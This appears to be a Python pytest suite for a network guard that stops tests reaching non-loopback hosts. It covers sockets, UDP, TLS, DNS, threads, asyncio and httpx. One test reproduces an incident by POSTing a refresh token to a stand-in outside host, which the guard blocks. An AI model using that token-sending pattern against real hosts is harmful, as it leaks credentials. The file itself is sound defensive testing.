"""The suite cannot talk to the outside world (``tests/network_guard.py``).

Addresses are from the documentation ranges (TEST-NET-1, ``.invalid``); the
guard raises before anything is resolved or sent.
"""

from __future__ import annotations

import asyncio
import contextlib
import ipaddress
import socket
import ssl
import threading
from concurrent.futures import ThreadPoolExecutor

import pytest

from tests import network_guard
from tests.network_guard import NetworkAccessBlockedError

# TEST-NET-1 (RFC 5737) and the reserved .invalid TLD (RFC 2606).
OUTSIDE_IP = str(ipaddress.ip_network("192.0.2.0/24")[1])
OUTSIDE_NAME = "outside-host.invalid"
PORT = 443


@pytest.fixture
def expect_blocked():
    """These tests provoke refusals on purpose: forget the record before the
    autouse fixture would fail the test. Nothing is let through."""
    yield
    network_guard.drain_blocked()


def _connect_outside():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((OUTSIDE_IP, PORT))


def test_guard_is_installed():
    assert network_guard.is_installed()


def test_connect_to_outside_address_is_refused(expect_blocked):
    with pytest.raises(NetworkAccessBlockedError) as err:
        _connect_outside()
    assert OUTSIDE_IP in str(err.value) and str(PORT) in str(err.value)
    assert "socket.connect" in str(err.value)


def test_refusal_is_not_an_oserror():
    """Retry/fallback code for network errors must not treat it as one."""
    assert not issubclass(NetworkAccessBlockedError, OSError)


def test_connect_ex_and_create_connection_are_refused(expect_blocked):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with s, pytest.raises(NetworkAccessBlockedError):
        s.connect_ex((OUTSIDE_IP, PORT))
    with pytest.raises(NetworkAccessBlockedError):
        socket.create_connection((OUTSIDE_IP, PORT), timeout=1)
    with pytest.raises(NetworkAccessBlockedError, match="create_connection"):
        socket.create_connection((OUTSIDE_NAME, PORT), timeout=1)


def test_connect_by_hostname_is_refused(expect_blocked):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with s, pytest.raises(NetworkAccessBlockedError, match="outside-host"):
        s.connect((OUTSIDE_NAME, PORT))


def test_udp_sendto_is_refused(expect_blocked):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        with pytest.raises(NetworkAccessBlockedError) as err:
            s.sendto(b"never-sent", (OUTSIDE_IP, 53))
        with pytest.raises(NetworkAccessBlockedError):
            s.sendto(b"never-sent", 0, (OUTSIDE_IP, 53))
    assert "never-sent" not in str(err.value)


def test_what_counts_as_loopback():
    assert network_guard.is_loopback_host("::1")
    assert network_guard.is_loopback_host("::ffff:127.0.0.1")
    assert network_guard.is_loopback_host("127.5.6.7")
    assert network_guard.is_loopback_host("LOCALHOST")
    assert network_guard.is_loopback_host(b"localhost")
    assert not network_guard.is_loopback_host("::ffff:" + OUTSIDE_IP)
    assert not network_guard.is_loopback_host("2001:db8::1")
    assert not network_guard.is_loopback_host("0.0.0.0")
    assert not network_guard.is_loopback_host("")
    assert not network_guard.is_loopback_host(None)
    assert not network_guard.is_loopback_host("localhost." + OUTSIDE_NAME)


def test_tls_connect_is_refused(expect_blocked):
    """An HTTPS client ends in ``SSLSocket.connect`` → ``socket.socket.connect``."""
    ctx = ssl.create_default_context()
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tls = ctx.wrap_socket(raw, server_hostname=OUTSIDE_NAME, do_handshake_on_connect=False)
    with tls, pytest.raises(NetworkAccessBlockedError):
        tls.connect((OUTSIDE_IP, PORT))


def test_refused_in_a_worker_thread(expect_blocked):
    caught: list[BaseException] = []

    def work():
        try:
            _connect_outside()
        except BaseException as exc:  # handed to the main thread
            caught.append(exc)

    t = threading.Thread(target=work)
    t.start()
    t.join()
    assert len(caught) == 1 and isinstance(caught[0], NetworkAccessBlockedError)

    with ThreadPoolExecutor(max_workers=1) as pool, pytest.raises(NetworkAccessBlockedError):
        pool.submit(_connect_outside).result()


async def test_refused_in_asyncio_to_thread(expect_blocked):
    with pytest.raises(NetworkAccessBlockedError):
        await asyncio.to_thread(_connect_outside)


async def test_refused_for_asyncio_streams(expect_blocked):
    with pytest.raises(NetworkAccessBlockedError):
        await asyncio.open_connection(OUTSIDE_IP, PORT)
    with pytest.raises(NetworkAccessBlockedError):
        await asyncio.open_connection(OUTSIDE_NAME, PORT)


async def test_refused_for_httpx_and_message_has_no_payload(expect_blocked):
    """The shape of the incident: an HTTPS POST of a token to an outside host."""
    import httpx

    body = "invented-token-value"
    with pytest.raises(NetworkAccessBlockedError) as err:
        async with httpx.AsyncClient() as client:
            await client.post(f"https://{OUTSIDE_NAME}/token", data={"refresh_token": body})
    assert body not in str(err.value) and "/token" not in str(err.value)
    assert OUTSIDE_NAME in str(err.value)

    with pytest.raises(NetworkAccessBlockedError), httpx.Client() as client:
        client.get(f"http://{OUTSIDE_IP}/")


def test_dns_lookup_of_outside_name_is_refused(expect_blocked):
    with pytest.raises(NetworkAccessBlockedError, match="getaddrinfo"):
        socket.getaddrinfo(OUTSIDE_NAME, PORT)
    with pytest.raises(NetworkAccessBlockedError):
        socket.getaddrinfo(OUTSIDE_NAME.encode(), PORT)
    with pytest.raises(NetworkAccessBlockedError):
        socket.gethostbyname(OUTSIDE_NAME)
    with pytest.raises(NetworkAccessBlockedError):
        socket.gethostbyname_ex(OUTSIDE_NAME)


def test_local_lookups_still_work():
    assert socket.getaddrinfo("localhost", 80)
    assert socket.getaddrinfo(None, 80)
    # An IP literal needs no DNS query; connecting to it is a separate check.
    assert socket.getaddrinfo(OUTSIDE_IP, PORT, type=socket.SOCK_STREAM)
    assert socket.gethostbyname("localhost").startswith("127.")


def test_loopback_connect_works():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind(("127.0.0.1", 0))
        server.listen(2)
        port = server.getsockname()[1]
        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            conn, _ = server.accept()
            with conn:
                client.sendall(b"ping")
                assert conn.recv(4) == b"ping"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.settimeout(5)
            assert client.connect_ex(("localhost", port)) == 0
            server.accept()[0].close()


async def test_loopback_asyncio_server_works():
    async def echo(reader, writer):
        writer.write(await reader.read(4))
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(echo, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    async with server:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(b"ping")
        await writer.drain()
        assert await reader.read(4) == b"ping"
        writer.close()
        await writer.wait_closed()


@pytest.mark.skipif(not hasattr(socket, "AF_UNIX"), reason="no Unix domain sockets")
def test_unix_sockets_work():
    a, b = socket.socketpair()
    with a, b:
        a.sendall(b"ping")
        assert b.recv(4) == b"ping"


def test_udp_loopback_works():
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    with rx, tx:
        rx.bind(("127.0.0.1", 0))
        rx.settimeout(5)
        tx.sendto(b"ping", rx.getsockname())
        assert rx.recv(4) == b"ping"


def test_a_swallowed_refusal_still_fails_the_test():
    """Code under test often catches ``Exception`` around I/O; the autouse
    fixture reports ``failure_message()`` at teardown."""
    network_guard.drain_blocked()
    with contextlib.suppress(Exception):  # what application code does
        _connect_outside()
    message = network_guard.failure_message()
    assert message and "network access attempted" in message
    assert OUTSIDE_IP in message and str(PORT) in message
    assert network_guard.failure_message() is None  # reported once


def test_install_puts_a_removed_guard_back():
    """Every test starts with ``install()``, so a guard left off by an earlier
    test (without monkeypatch) is back for the next one."""
    original = socket.socket.connect
    try:
        socket.socket.connect = lambda *_a, **_k: None
        socket.getaddrinfo = lambda *_a, **_k: []
        assert not network_guard.is_installed()
    finally:
        network_guard.install()
    assert network_guard.is_installed() and socket.socket.connect is original
    network_guard.uninstall()
    try:
        assert not network_guard.is_installed()
    finally:
        network_guard.install()
    assert network_guard.is_installed()
